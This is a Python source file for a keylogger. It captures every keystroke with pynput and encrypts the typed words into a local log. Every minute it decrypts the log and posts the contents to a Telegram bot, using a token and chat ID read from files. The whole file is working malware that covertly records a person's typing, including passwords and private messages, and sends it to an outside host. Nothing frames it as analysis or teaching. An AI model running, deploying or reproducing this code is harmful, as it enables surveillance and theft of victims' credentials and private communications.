import sys
import os
import requests
from pynput import keyboard
from cryptography.fernet import Fernet
import time
import schedule
import threading

def load_value(file):
    if not os.path.exists(file):
        print(f"[ERROR] {file} not found!")
        sys.exit(1)
    with open(file, "r") as f:
        return f.read()
    
KEY_FILE = "secret.key"
log_file = "keylogs_encrypted.txt"
current_line = ""
token = load_value("telegram.key") 
CHAT_ID = load_value("chatid.key")

    
def load_key():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as f:
            f.write(key)
        return key
    with open(KEY_FILE, "rb") as f:
        return f.read()

key = load_key()
cipher = Fernet(key)

def esave(keystroke):
    global current_line
    if keystroke == " ":
        encrypted_line = cipher.encrypt(current_line.encode())
        with open(log_file, "ab") as f:
            f.write(encrypted_line + b"\n")
        current_line = ""
    else:
        current_line += keystroke

def send_telegram():
    try:
        decrypted_logs = ""

        with open(log_file, "rb") as f:
            for line in f:
                try:
                    decrypted_line = cipher.decrypt(line.strip()).decode()
                    decrypted_logs += decrypted_line + "\n"
                except Exception as e:
                    print(f"[!] Decryption error on a line: {e}")

        if decrypted_logs:
            response = requests.post(
                f"https://api.telegram.org/bot{token}/sendMessage", 
                data={"chat_id": CHAT_ID, "text": decrypted_logs} 
            )
            if response.status_code == 200:
                print("[+] Decrypted logs sent to Telegram!")
                open(log_file, 'w').close()

            else:
                print(f"[!] Error sending logs to Telegram: {response.status_code} - {response.text}")

        else:
             print("No logs to send or all logs failed to decrypt.")

    except Exception as e:
        print(f"[!] Error in send_telegram: {e}")



def start_scheduler():
    schedule.every(1).minutes.do(send_telegram)
    while True:
        schedule.run_pending()
        time.sleep(1)

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            esave(key.char)
        elif key == keyboard.Key.enter:
            esave("[Key.Enter]")
        elif key == keyboard.Key.space:
            esave(" ")
        elif key == keyboard.Key.esc:
            print("Exiting program...")
            sys.exit(0)
        else:
            esave(f"[{key}]")
    except Exception as e:
        print(f"Error: {e}")

scheduler_thread = threading.Thread(target=start_scheduler)
scheduler_thread.daemon = True
scheduler_thread.start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
